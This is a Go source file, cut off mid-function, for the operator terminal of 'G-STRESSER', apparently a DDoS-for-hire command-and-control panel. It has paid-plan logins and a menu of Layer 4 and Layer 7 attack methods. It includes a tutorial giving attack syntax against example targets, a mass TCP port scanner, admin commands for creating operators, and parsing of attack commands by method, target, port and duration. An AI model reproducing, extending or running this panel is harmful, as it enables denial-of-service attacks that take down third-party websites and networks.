package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math"
	"net"
	"net/http"
	"net/url"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/fatih/color"
	cpu "github.com/mackerelio/go-osstat/cpu"
	mem "github.com/mackerelio/go-osstat/memory"
	uptime "github.com/mackerelio/go-osstat/uptime"
)

type Admin struct {
	conn net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
	return &Admin{conn}
}

const (
	ClrReset  = "\033[0m"
	ClrBlack  = "\033[30m"
	ClrRed    = "\033[31m"
	ClrGreen  = "\033[32m"
	ClrYellow = "\033[33m"
	ClrBlue   = "\033[34m"
	ClrPurp   = "\033[35m"
	ClrCyan   = "\033[36m"
	ClrWhite  = "\033[37m"
	ClrGray   = "\033[90m"

	ClrHiRed    = "\033[91m"
	ClrHiGreen  = "\033[92m"
	ClrHiYellow = "\033[93m"
	ClrHiBlue   = "\033[94m"
	ClrHiPurp   = "\033[95m"
	ClrHiCyan   = "\033[96m"
	ClrHiWhite  = "\033[97m"
)

func SmartAnimate(conn net.Conn, text string, delay int) {
	inEscape := false
	for _, c := range text {
		if c == '\033' {
			inEscape = true
		}

		conn.Write([]byte(string(c)))

		if inEscape {
			if (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') {
				inEscape = false
			}
			continue
		}

		if c == '\n' || c == '\r' || c == ' ' {
			continue
		}
		time.Sleep(time.Duration(delay) * time.Millisecond)
	}
}

func SafeRepeat(char string, count int) string {
	if count <= 0 {
		return ""
	}
	return strings.Repeat(char, count)
}

func GradientString(text string, r1, g1, b1, r2, g2, b2 int) string {
	runes := []rune(text)
	length := len(runes)
	if length <= 1 {
		return fmt.Sprintf("\033[38;2;%d;%d;%dm%s\033[0m", r1, g1, b1, text)
	}
	var result strings.Builder
	for i, c := range runes {
		// Linear interpolation for each channel
		r := r1 + (r2-r1)*i/(length-1)
		g := g1 + (g2-g1)*i/(length-1)
		b := b1 + (b2-b1)*i/(length-1)
		result.WriteString(fmt.Sprintf("\033[38;2;%d;%d;%dm%c", r, g, b, c))
	}
	result.WriteString("\033[0m")
	return result.String()
}

func NeonCyanMagenta(text string) string {
	return GradientString(text, 0, 255, 255, 255, 0, 255)
}

func NeonPurpleGreen(text string) string {
	return GradientString(text, 176, 38, 255, 0, 255, 65)
}

func (this *Admin) Handle() {
	this.conn.Write([]byte("\033[?1049h\033[2J\033[H\033[3J"))
	this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

	bgBlack := color.New(color.BgHiBlack).SprintFunc()
	bgGreen := color.New(color.BgGreen).SprintFunc()

	// Dynamic Title
	this.conn.Write([]byte("\033]0;G-STRESSER | DEPLOYING... \007"))

	// The secret has been decommissioned in favor of an instant Cyber Terminal launch.
	SmartAnimate(this.conn, ClrHiCyan+"INITIALIZING G-STRESSER CYBER TERMINAL INFRASTRUCTURE...\r\n", 30)
	// Cyber Banner V5 - Reinforced Glow
	border := ClrHiCyan + "    ╔" + SafeRepeat("═", 74) + "╗\r\n"
	logo := ClrHiCyan + "    ║" + ClrHiPurp + " ██████╗      ███████╗████████╗██████╗ ███████╗███████╗███████╗███████╗██████╗ " + ClrHiCyan + "║\r\n" +
		ClrHiCyan + "    ║" + ClrHiPurp + "██╔════╝      ██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔════╝██╔════╝██╔════╝██╔══██╗" + ClrHiCyan + "║\r\n" +
		ClrHiCyan + "    ║" + ClrHiPurp + "██║  ███╗████╗███████╗   ██║   ██████╔╝█████╗  ███████╗███████╗█████╗  ██████╔╝" + ClrHiCyan + "║\r\n" +
		ClrHiCyan + "    ║" + ClrHiPurp + "██║   ██║╚═══╝╚════██║   ██║   ██╔══██╗██╔══╝  ╚════██║╚════██║██╔══╝  ██╔══██╗" + ClrHiCyan + "║\r\n" +
		ClrHiCyan + "    ║" + ClrHiPurp + "╚██████╔╝     ███████║   ██║   ██║  ██║███████╗███████║███████║███████╗██║  ██║" + ClrHiCyan + "║\r\n" +
		ClrHiCyan + "    ║" + ClrHiPurp + " ╚═════╝      ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝ " + ClrHiCyan + "║\r\n"
	footer := ClrHiCyan + "    ╚" + SafeRepeat("═", 74) + "╝\r\n"

net_login:
	this.conn.Write([]byte("\033[2J\033[H\033[3J"))
	this.conn.Write([]byte(border + logo + footer))
	this.conn.Write([]byte("\r\n"))
	this.conn.Write([]byte(ClrGray + SafeRepeat(" ", 14) + "[+] " + ClrHiWhite + "DEPLOYED BY SYSTEM OVERRIDE | G-STRESSER NETWORK" + ClrGray + " [+]\r\n\n"))
	this.conn.Write([]byte(SafeRepeat(" ", 4) + ClrWhite + "Please enter your operator credentials:\r\n" + ClrReset))
	this.conn.Write([]byte("\r\n"))
	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	this.conn.Write([]byte(SafeRepeat(" ", 4) + bgBlack(ClrHiCyan+" Username ") + " " + ClrHiWhite + "→ " + ClrReset))
	username, err := this.ReadLine(false)
	if err != nil {
		return
	}

	// Get password
	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	this.conn.Write([]byte(SafeRepeat(" ", 4) + bgBlack(ClrHiCyan+" Password  ") + " " + ClrHiWhite + "→ " + ClrReset))
	password, err := this.ReadLine(true)
	if err != nil {
		return
	}
	//Attempt  Login
	this.conn.SetDeadline(time.Now().Add(120 * time.Second))
	this.conn.Write([]byte("\r\n"))
	spinBuf := []string{"⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"}
	for i := 0; i < 40; i++ {
		this.conn.Write([]byte("\r" + SafeRepeat(" ", 4) + ClrHiPurp + spinBuf[i%len(spinBuf)] + " " + ClrReset + GradientString("Verifying Secure Neural Uplink... ", 176, 38, 255, 0, 255, 65)))
		time.Sleep(time.Duration(60) * time.Millisecond)
	}
	this.conn.Write([]byte("\r\n"))

	//if credentials are incorrect output error and close session
	var loggedIn bool
	var userInfo AccountInfo
	if loggedIn, userInfo = database.TryLogin(username, password, this.conn.RemoteAddr()); !loggedIn {
		this.conn.Write([]byte("\n" + SafeRepeat(" ", 4) + ClrRed + "[ACCESS DENIED] INVALID OPERATOR CREDENTIALS. RETRYING...\r\n" + ClrReset))
		time.Sleep(2 * time.Second)
		goto net_login
	}
	if !userInfo.cncAccess {
		this.conn.Write([]byte("\n" + SafeRepeat(" ", 4) + ClrRed + "[ACCESS DENIED] YOUR CLEARANCE LEVEL DOES NOT INCLUDE C2 TERMINAL ACCESS.\r\n" + ClrReset))
		this.conn.Write([]byte(SafeRepeat(" ", 4) + ClrHiYellow + fmt.Sprintf("Upgrade to [%s] or higher to unlock the full C2 infrastructure suite!\r\n", userInfo.NextCncPlan) + ClrReset))
		time.Sleep(4 * time.Second)
		this.conn.Close()
		return
	}
	this.conn.Write([]byte("\033[2J\033[H\033[3J"))
	// Header
	go func() {
		i := 0
		for {
			time.Sleep(time.Second)
			if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; �️ G-STRESSER COMMAND CENTER | OP: %s\007", username))); err != nil {
				this.conn.Close()
				break
			}
			i++
			if i%60 == 0 {
				this.conn.SetDeadline(time.Now().Add(120 * time.Second))
			}
		}
	}()

	// Cyber Banner V3 - Reinforced Frame
	border = ClrHiPurp + "  ╔" + SafeRepeat("═", 78) + "╗\r\n"
	logo = ClrHiPurp + "  ║  ██████╗      ███████╗████████╗██████╗ ███████╗███████╗███████╗███████╗██████╗  ║\r\n" +
		ClrHiPurp + "  ║ ██╔════╝      ██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔════╝██╔════╝██╔════╝██╔══██╗ ║\r\n" +
		ClrHiPurp + "  ║ ██║  ███╗████╗███████╗   ██║   ██████╔╝█████╗  ███████╗███████╗█████╗  ██████╔╝ ║\r\n" +
		ClrHiPurp + "  ║ ██║   ██║╚═══╝╚════██║   ██║   ██╔══██╗██╔══╝  ╚════██║╚════██║██╔══╝  ██╔══██╗ ║\r\n" +
		ClrHiPurp + "  ║ ╚██████╔╝     ███████║   ██║   ██║  ██║███████╗███████║███████║███████╗██║  ██║ ║\r\n" +
		ClrHiPurp + "  ║  ╚═════╝      ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝  ║\r\n"
	footer = ClrHiPurp + "  ╚" + SafeRepeat("═", 78) + "╝\r\n"

	this.conn.Write([]byte(border + logo + footer))
	this.conn.Write([]byte("\033[?25l")) // Hide cursor during animation
	this.conn.Write([]byte("\r\n"))
	this.conn.Write([]byte(ClrGray + SafeRepeat(" ", 14) + "[+] " + NeonCyanMagenta("DEPLOYED BY SYSTEM OVERRIDE | G-STRESSER NETWORK") + ClrGray + " [+]\r\n\n"))
	SmartAnimate(this.conn, SafeRepeat(" ", 4)+ClrGray+"Authentication passed for operator: "+ClrHiGreen+username+ClrReset+"\r\n", 30)
	this.conn.Write([]byte("\r\n"))
	color.HiGreen("New login operator: %s %s", username, color.RedString("%s", this.conn.RemoteAddr()))
	for {
		// New Plan-Aware Prompt
		pColor := "\033[45;1;37m" // Default Purple
		if strings.ToLower(userInfo.plan) == "admin" {
			pColor = "\033[41;1;37m" // Red for Admin
		} else if strings.HasPrefix(strings.ToUpper(userInfo.plan), "VIP") {
			pColor = "\033[44;1;37m" // Blue for VIP
		}

		prompt := fmt.Sprintf("\r\n\033[K    %s G-STRESSER \033[0m\033[42;1;30m [%s] \033[0m\033[40;1;36m (%s|%ds|%dc) \033[0m\033[1;32m~# \033[0m",
			pColor, username, strings.ToUpper(userInfo.plan), userInfo.maxTime, userInfo.concs,
		)
		this.conn.Write([]byte(prompt))
		cmd, err := this.ReadLine(false)

		cmd_lowercase := strings.ToLower(cmd)
		cmd = cmd_lowercase
		if err != nil || cmd == "exit" || cmd == "quit" {
			this.conn.Write([]byte(ClrWhite + "Session Terminated. Bye!\r\n" + ClrReset))
			return
		}
		if cmd == "" {
			continue
		}
		if cmd == "cc" || cmd == "cl" || cmd == "clear" { // clear screen
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\033[100;1;1H"))
			this.conn.Write([]byte("\033[5m" + NeonPurpleGreen("  ██████╗      ███████╗████████╗██████╗ ███████╗███████╗███████╗███████╗██████╗ \r\n")))
			this.conn.Write([]byte(NeonPurpleGreen(" ██╔════╝      ██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔════╝██╔════╝██╔════╝██╔══██╗\r\n")))
			this.conn.Write([]byte(NeonPurpleGreen(" ██║  ███╗████╗███████╗   ██║   ██████╔╝█████╗  ███████╗███████╗█████╗  ██████╔╝\r\n")))
			this.conn.Write([]byte(NeonPurpleGreen(" ██║   ██║╚═══╝╚════██║   ██║   ██╔══██╗██╔══╝  ╚════██║╚════██║██╔══╝  ██╔══██╗\r\n")))
			this.conn.Write([]byte(NeonPurpleGreen(" ╚██████╔╝     ███████║   ██║   ██║  ██║███████╗███████║███████║███████╗██║  ██║\r\n")))
			this.conn.Write([]byte(NeonPurpleGreen("  ╚═════╝      ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝\r\n\033[25m")))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte(ClrGray + "        [+] " + NeonCyanMagenta("DEPLOYED BY SYSTEM OVERRIDE | G-STRESSER NETWORK") + ClrGray + " [+]\r\n\n"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\r\n"))
			continue
		}
		if cmd == "top" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte(bgBlack(NeonPurpleGreen("  G-STRESSER C2 - USAGE  "))))
			this.conn.Write([]byte("\r\n\n"))
			_, err := cpu.Get()
			if err == nil {
				before, _ := cpu.Get()
				time.Sleep(time.Duration(2) * time.Second)
				after, _ := cpu.Get()
				total := float64(after.Total - before.Total)
				cpustr := fmt.Sprintf("Total: %s | User: %s | System: %s | Idle: %s", color.HiMagentaString("%.2f%%", total), color.HiMagentaString("%.2f%%", float64(after.User-before.User)/total*100), color.HiMagentaString("%.2f%%", float64(after.System-before.System)/total*100), color.HiMagentaString("%.2f%%", float64(after.Idle-before.Idle)/total*100))
				this.conn.Write([]byte(bgGreen(color.HiBlackString("        CPU        ")) + bgBlack("   "+cpustr+"   \r\n")))
			}
			mem_stat, err := mem.Get()
			if err == nil {
				ramstr := fmt.Sprintf("%s / %s", color.HiMagentaString(ByteFormat(float64(mem_stat.Used), 1)), color.HiMagentaString(ByteFormat(float64(mem_stat.Total), 1)))
				this.conn.Write([]byte(bgGreen(color.HiBlackString("        RAM        ")) + bgBlack("   "+ramstr+"   \r\n")))
			}
			up_stat, err := uptime.Get()
			if err == nil {
				this.conn.Write([]byte(bgGreen(color.HiBlackString("        UPTIME     ")) + bgBlack("   "+color.HiMagentaString(fmt.Sprintf("%+v", up_stat))+"   \r\n")))
			}
			this.conn.Write([]byte("\r\n\n"))
			continue
		}
		if cmd == "gstresser" {

			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte(bgBlack(NeonPurpleGreen("  G-STRESSER C2 - INFO  "))))
			this.conn.Write([]byte("\r\n\n"))
			this.conn.Write([]byte(bgGreen(color.HiBlackString("        Author     ")) + bgBlack(color.WhiteString("   SYSTEM   ")) + "          \033[5m" + NeonPurpleGreen("  ██████╗      ███████╗████████╗██████╗ ███████╗███████╗\r\n")))
			this.conn.Write([]byte(bgGreen(color.HiBlackString("        Version    ")) + bgBlack(color.WhiteString("   3.0      ")) + "          " + NeonPurpleGreen(" ██╔════╝      ██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔════╝\r\n")))
			this.conn.Write([]byte(bgGreen(color.HiBlackString("        Platform   ")) + bgBlack(color.WhiteString("   G-STRESS ")) + "          " + NeonPurpleGreen(" ██║  ███╗████╗███████╗   ██║   ██████╔╝█████╗  ███████╗\r\n")))
			this.conn.Write([]byte(bgGreen(color.HiBlackString("        Made in    ")) + bgBlack(color.WhiteString("   Go       ")) + "          " + NeonPurpleGreen(" ██║   ██║╚═══╝╚════██║   ██║   ██╔══██╗██╔══╝  ╚════██║\r\n")))
			this.conn.Write([]byte("                                         " + NeonPurpleGreen(" ╚██████╔╝     ███████║   ██║   ██║  ██║███████╗███████║\r\n")))
			this.conn.Write([]byte("                                         " + NeonPurpleGreen("  ╚═════╝      ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝\r\n\033[25m")))
			this.conn.Write([]byte("\r\n\n"))
			continue
		}

		if cmd == "methods" || cmd == "vector" || cmd == "vectors" {
			this.conn.Write([]byte("\033[2J\033[H\033[3J"))
			methodsPath := filepath.Join(database.base_dir, "..", "database", "methods.json")
			mdata, mErr := ioutil.ReadFile(methodsPath)
			if mErr != nil {
				this.conn.Write([]byte(ClrRed + "    [ERROR] FAILED TO SYNC GLOBAL METHOD DATABASE\r\n\n" + ClrReset))
				continue
			}

			var mJson map[string]map[string]interface{}
			if err := json.Unmarshal(mdata, &mJson); err == nil {
				this.conn.Write([]byte("\r\n"))
				title := "  G-STRESSER - UNIFIED VECTOR MATRIX (ONLINE)  "
				paddingTitle := (76 - len(title)) / 2
				this.conn.Write([]byte(SafeRepeat(" ", paddingTitle) + bgBlack(NeonPurpleGreen(title))))
				this.conn.Write([]byte("\r\n\n"))

				this.conn.Write([]byte(ClrHiCyan + "    ╔══════════════════════════════════════════════════════════════════╗\r\n"))

				keys := make([]string, 0, len(mJson))
				for k := range mJson {
					keys = append(keys, k)
				}
				sort.Strings(keys)

				for _, layerName := range keys {
					layerMethods := mJson[layerName]
					onlineMethods := []string{}
					for m, obj := range layerMethods {
						if mObj, ok := obj.(map[string]interface{}); ok {
							if st, ok := mObj["status"].(string); ok && strings.ToLower(st) == "online" {
								onlineMethods = append(onlineMethods, m)
							}
						}
					}
					sort.Strings(onlineMethods)

					if len(onlineMethods) == 0 {
						continue
					}

					// Inner width 66.
					label := " [ " + strings.ToUpper(layerName) + " ] "
					padding := 66 - len(label)
					this.conn.Write([]byte(ClrHiCyan + "    ║" + ClrHiPurp + label + ClrHiCyan + SafeRepeat(" ", padding) + "║\r\n"))

					for i := 0; i < len(onlineMethods); i += 3 {
						row := "    ║ "
						for j := 0; j < 3; j++ {
							if i+j < len(onlineMethods) {
								mName := onlineMethods[i+j]
								if len(mName) > 12 {
									mName = mName[:12]
								}
								// Cell 21: ●(1) + space(1) + name(n) + dots(15-n) + space(4) = 21
								dotsCount := 15 - len(mName)
								cell := ClrHiGreen + "● " + ClrWhite + mName + ClrGray + SafeRepeat(".", dotsCount) + ClrReset + "    "
								row += cell
							} else {
								row += SafeRepeat(" ", 21)
							}
							if j < 2 {
								row += ClrHiCyan + " " + ClrReset
							}
						}
						// Row content: Space(1) + 21 (C1) + 1 (S) + 21 (C2) + 1 (S) + 21 (C3) = 65.
						// Plus 1 space to reach 66.
						row += " " + ClrHiCyan + "║\r\n"
						this.conn.Write([]byte(row))
					}
					this.conn.Write([]byte(ClrHiCyan + "    ╠══════════════════════════════════════════════════════════════════╣\r\n"))
				}
				this.conn.Write([]byte(ClrHiCyan + "    ║ " + ClrGray + "SCAN TARGETS VIA 'scanports' BEFORE DEPLOYMENT" + SafeRepeat(" ", 19) + "║\r\n"))
				this.conn.Write([]byte(ClrHiCyan + "    ╚══════════════════════════════════════════════════════════════════╝\r\n"))
			}
			this.conn.Write([]byte("\r\n"))
			continue
		}

		if cmd == "gstresser" || cmd == "logo" || cmd == "main" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte(border + logo + footer))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte(ClrGray + "        [+]   " + ClrHiWhite + "DEPLOYED BY SYSTEM OVERRIDE | G-STRESSER NETWORK" + ClrGray + "   [+]\r\n\n"))
			continue
		}

		if cmd == "help" || cmd == "cmd" || cmd == "commands" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte(bgBlack(NeonPurpleGreen("  G-STRESSER C2 - COMMAND CENTER  "))))
			this.conn.Write([]byte("\r\n\n"))
			this.conn.Write([]byte(bgBlack(ClrWhite+"    methods       "+ClrReset) + "  " + ClrGray + "Visualize available network vectors" + ClrReset + "\r\n"))
			this.conn.Write([]byte(bgBlack(ClrWhite+"    attack        "+ClrReset) + "  " + ClrGray + "Tutorial: How to launch a session" + ClrReset + "\r\n"))
			this.conn.Write([]byte(bgBlack(ClrWhite+"    gstresser     "+ClrReset) + "  " + ClrGray + "Return to main terminal interface" + ClrReset + "\r\n"))
			this.conn.Write([]byte(bgBlack(ClrWhite+"    top           "+ClrReset) + "  " + ClrGray + "Monitor live network scaling" + ClrReset + "\r\n"))
			this.conn.Write([]byte(bgBlack(ClrWhite+"    scanports     "+ClrReset) + "  " + ClrGray + "Target vulnerability scanner" + ClrReset + "\r\n"))
			this.conn.Write([]byte(bgBlack(ClrWhite+"    clear         "+ClrReset) + "  " + ClrGray + "Wipe terminal data stream" + ClrReset + "\r\n"))
			if userInfo.admin == 1 {
				this.conn.Write([]byte("\r\n\n"))
				this.conn.Write([]byte(bgBlack(NeonPurpleGreen("  G-STRESSER C2 - ADMIN  "))))
				this.conn.Write([]byte("\r\n\n"))
				this.conn.Write([]byte(bgBlack(ClrWhite+"    block         "+ClrReset) + "\r\n"))
				this.conn.Write([]byte(bgBlack(ClrWhite+"    unblock       "+ClrReset) + "\r\n"))
				this.conn.Write([]byte(bgBlack(ClrWhite+"    addadmin      "+ClrReset) + "\r\n"))
				this.conn.Write([]byte(bgBlack(ClrWhite+"    adduser       "+ClrReset) + "\r\n"))
				this.conn.Write([]byte(bgBlack(ClrWhite+"    removeuser    "+ClrReset) + "\r\n"))
			}
			this.conn.Write([]byte("\r\n\n"))
			continue
		}

		if cmd == "attack" || cmd == "tutorial" || cmd == "howto" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte(bgBlack(NeonPurpleGreen("  G-STRESSER - SESSION TUTORIAL  "))))
			this.conn.Write([]byte("\r\n\n"))
			this.conn.Write([]byte(ClrHiCyan + "  [STEP 1] Identify Method\r\n"))
			this.conn.Write([]byte(ClrGray + "  Type 'methods' to see all vectors. Example: 'TLS'\r\n\n" + ClrReset))
			this.conn.Write([]byte(ClrHiCyan + "  [STEP 2] Syntax Construction\r\n"))
			this.conn.Write([]byte(ClrGray + "  Format: [METHOD] [TARGET] [PORT] [TIME]\r\n\n" + ClrReset))
			this.conn.Write([]byte(ClrHiCyan + "  [EXAMPLES]\r\n"))
			this.conn.Write([]byte(ClrWhite + "  L7: " + ClrReset + "TLS https://example.com 443 60\r\n"))
			this.conn.Write([]byte(ClrWhite + "  L4: " + ClrReset + "UDP 1.1.1.1 80 60\r\n\n"))
			this.conn.Write([]byte(ClrHiWhite + "  Note: Targets are sanitized by our whitelisting system.\r\n" + ClrReset))
			this.conn.Write([]byte("\r\n"))
			continue
		}

		if cmd == "clear" || cmd == "cls" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			continue
		}
		if cmd == "scanports" {
			this.conn.Write([]byte(ClrHiGreen + "Target Host → " + ClrReset))
			ip, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if !IsValidIPv4(ip) {
				this.conn.Write([]byte(ClrRed + "\nInvalid IPv4 Address.\r\n\n" + ClrReset))
				continue
			}

			var wg sync.WaitGroup
			tcpPorts := make(chan int)
			tcpResults := make(chan string)
			maxTCPPorts := 65535

			go func() {
				for i := 0; i < maxTCPPorts; i++ {
					tcpPorts <- i
				}
				close(tcpPorts)
			}()

			for i := 0; i < 10000; i++ {
				wg.Add(1)
				go func() {
					defer wg.Done()
					for port := range tcpPorts {
						address := fmt.Sprintf("%s:%d", ip, port)
						tcpConn, err := net.DialTimeout("tcp", address, 2*time.Second)
						if err == nil {
							tcpConn.Close()
							spaces := 10
							portLength := len(fmt.Sprintf("%d", port))
							leftSpaces := (spaces - portLength) / 2
							rightSpaces := spaces - portLength - leftSpaces
							formatted := fmt.Sprintf("%s%d%s", SafeRepeat(" ", leftSpaces), port, SafeRepeat(" ", rightSpaces))
							tcpResults <- bgGreen(ClrBlack+"   TCP   ") + bgBlack(ClrHiGreen+fmt.Sprintf("%s\r\n", formatted))

						}
					}
				}()
			}
			go func() {
				wg.Wait()
				close(tcpResults)
			}()

			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte(bgBlack(GradientString("  G-STRESSER C2 - PORT SCANNER  ", 176, 38, 255, 0, 255, 65))))
			this.conn.Write([]byte("\r\n\n"))

			for result := range tcpResults {
				this.conn.Write([]byte(result))
			}
			this.conn.Write([]byte("\r\n\n"))
			continue
		}

		if userInfo.admin == 1 && cmd == "block" {
			this.conn.Write([]byte(ClrHiGreen + "Target IPv4/Subnet → " + ClrReset))
			new_pr, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte(ClrHiPurp + "Are you sure? (y/n) → " + ClrReset))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.BlockRange(new_pr) {
				this.conn.Write([]byte(ClrRed + "An unknown error occured.\r\n" + ClrReset))
			} else {
				this.conn.Write([]byte(ClrHiGreen + "Successfully appended to whitelist.\r\n" + ClrReset))
			}
			continue
		}

		if userInfo.admin == 1 && cmd == "unblock" {
			this.conn.Write([]byte(ClrHiGreen + "Target IPv4/Subnet → " + ClrReset))
			rm_pr, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte(ClrHiPurp + "Are you sure? (y/n) → " + ClrReset))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.UnBlockRange(rm_pr) {
				this.conn.Write([]byte(ClrRed + "An unknown error occured.\r\n" + ClrReset))
			} else {
				this.conn.Write([]byte(ClrHiGreen + "Successfully removed from whitelist.\r\n" + ClrReset))
			}
			continue
		}

		if userInfo.admin == 1 && cmd == "adduser" {
			this.conn.Write([]byte(color.HiGreenString("Username → ")))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte(color.HiGreenString("Password → ")))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte(color.HiGreenString("Max attack duration (s) → ")))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				this.conn.Write([]byte(color.HiRedString("Failed to parse the attack duration limit\r\n")))
				continue
			}
			this.conn.Write([]byte(color.HiGreenString("Cooldown (s) → ")))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				this.conn.Write([]byte(color.HiRedString("Failed to parse the cooldown\r\n")))
				continue
			}
			this.conn.Write([]byte(color.HiMagentaString("Username: %s | Password: %s | Max Attack Time: %ss | Cooldown: %ss\r\n\n", new_un, new_pw, duration_str, cooldown_str)))
			this.conn.Write([]byte(color.HiGreenString("Confirm creation? (y/n) → ")))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.CreateBasic(new_un, new_pw, duration, cooldown) {
				this.conn.Write([]byte(color.HiRedString("Failed to create new user. Username might already exist.\r\n")))
			} else {
				this.conn.Write([]byte(color.HiGreenString("Operator %s initialized successfully.\r\n", new_un)))
			}
			continue
		}

		if userInfo.admin == 1 && cmd == "addadmin" {
			this.conn.Write([]byte(color.HiGreenString("Username → ")))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte(color.HiGreenString("Password → ")))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte(color.HiGreenString("Max attack duration (s) → ")))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				this.conn.Write([]byte(color.HiRedString("Failed to parse the attack duration limit\r\n")))
				continue
			}
			this.conn.Write([]byte(color.HiGreenString("Cooldown (s) → ")))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				this.conn.Write([]byte(color.HiRedString("Failed to parse the cooldown\r\n")))
				continue
			}
			this.conn.Write([]byte(color.HiMagentaString("Username: %s | Password: %s | Max Attack Time: %ss | Cooldown: %ss\r\n\n", new_un, new_pw, duration_str, cooldown_str)))
			this.conn.Write([]byte(color.HiGreenString("Confirm creation? (y/n) → ")))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.CreateAdmin(new_un, new_pw, duration, cooldown) {
				this.conn.Write([]byte(color.HiRedString("Failed to construct privileges. An unknown error occured.\r\n")))
			} else {
				this.conn.Write([]byte(color.HiGreenString("Administrator %s elevated successfully.\r\n", new_un)))
			}
			continue
		}

		if userInfo.admin == 1 && cmd == "removeuser" {
			this.conn.Write([]byte(ClrHiGreen + "Username to terminate → " + ClrReset))
			rm_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte(ClrRed + "Are you sure want to remove " + rm_un + " forever? (y/n) " + ClrReset))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.RemoveUser(rm_un) {
				this.conn.Write([]byte(ClrRed + "Failed to terminate user.\r\n" + ClrReset))
			} else {
				this.conn.Write([]byte(ClrHiPurp + "Operator successfully removed from mainframes.\r\n" + ClrReset))
			}
			continue
		}
		parts := strings.Split(cmd, " ")
		cmd = strings.Trim(parts[0], " ")
		switch cmd {
		default:
			cmd_upper := strings.ToUpper(cmd)
			if IsValidMethod(cmd_upper) {
				if len(parts) < 4 {
					this.conn.Write([]byte(ClrRed + "[ERROR] INVALID SESSION ARGUMENTS. USAGE: [METHOD] [TARGET] [PORT] [DURATION]\r\n\n" + ClrReset))
					continue
				}

				target := strings.Trim(parts[1], " ")
				methodType := GetMethodType(cmd_upper)

				if methodType == "layer7" {
					if !IsValidUrl(target) {
						this.conn.Write([]byte(ClrRed + "[DENIED] PROTOCOL VIOLATION: LAYER 7 REQUIRES A VALID URL (HTTP/HTTPS)\r\n\n" + ClrReset))
						continue
					}
				} else {
					if !IsValidIPv4(target) {
						this.conn.Write([]byte(color.HiRedString("[DENIED] PROTOCOL VIOLATION: LAYER 4 REQUIRES A VALID IPV4 HOST\r\n\n")))
						continue
					}
				}

				port, err := strconv.Atoi(strings.Trim(parts[2], " "))
				if err != nil || port < 1 || port > 65535 {
					this.conn.Write([]byte(color.HiRedString("[ERROR] PORT RANGE OVERFLOW: VALID RANGE IS 1-65535\r\n\n")))
					continue
				}

				duration, err := strconv.Atoi(strings.Trim(parts[3], " "))
				if err != nil {
					this.conn.Write([]byte(color.HiRedString("[ERROR] TEMPORAL PARAMETER ERROR: FAILED TO PARSE DURATION\r\n\n")))
					continue
				}

				// Optional concs (nodes) parameter
				requestedConc := userInfo.concs
				if len(parts) >= 5 {
					if c, err := strconv.Atoi(strings.Trim(parts[4], " ")); err == nil && c > 0 {
						if c > userInfo.concs {
